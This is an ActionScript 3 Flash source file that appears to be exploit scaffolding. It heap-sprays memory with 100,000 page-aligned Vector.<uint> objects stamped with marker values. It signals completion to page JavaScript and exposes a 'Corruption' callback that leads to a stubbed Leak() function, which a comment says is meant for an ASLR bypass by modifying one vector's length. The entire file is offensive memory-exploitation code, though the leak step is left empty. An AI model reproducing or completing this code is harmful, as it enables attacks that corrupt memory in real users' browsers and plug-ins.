package
{    
	import flash.display.*;
	import flash.text.*;
	import flash.system.*;
	import flash.geom.*;
	import flash.external.*;
	import flash.events.*;
	
	public class Main extends Sprite
	{
		private var spray:Array
		public function AsSpray():void
		{
			var block:Vector.<Object> = null;
			var size:uint = 100000;
			var alignment:uint = 0x1000;
			var index:uint = 0;
			spray = new Array();
			for(index = 0; index < size; index++)
			{
				spray[index] = new Vector.<uint>((alignment-0x8)/0x4);
				spray[index][0]=0xAAAAAAAA;
				spray[index][1]=0xBBBBBBBB;
				spray[index][2]=0xCCCCCCCC;
				spray[index][3]=0xDDDDDDDD;
			}	
		}
		public function Leak():void
		{
			//perform ASLR bypass with 1 object's length modified
		}
		public function Main():void
		{
			AsSpray();
			ExternalInterface.call("check","Vector Spray done");
			ExternalInterface.addCallback("Corruption",Leak);
		}
	}
}
